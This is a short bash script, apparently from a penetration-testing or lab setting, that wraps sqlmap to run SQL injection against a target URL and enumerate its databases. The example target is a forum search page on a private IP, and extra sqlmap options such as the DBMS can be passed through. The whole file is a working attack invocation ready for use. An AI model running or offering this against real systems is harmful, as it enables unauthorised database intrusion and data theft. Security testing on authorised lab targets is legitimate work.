#!/bin/bash
#Target in format "http://192.168.1.202/?p=1&forumaction=search"
#target specific dbms, add as parameter when runnning script, e.g. --dbms=PostgreSQL
export TARGET=$1
shift # Shift positional parameters to the left (i.e., $2 becomes $1, $3 becomes $2, etc.)
sqlmap -u $TARGET --dbs "$@"
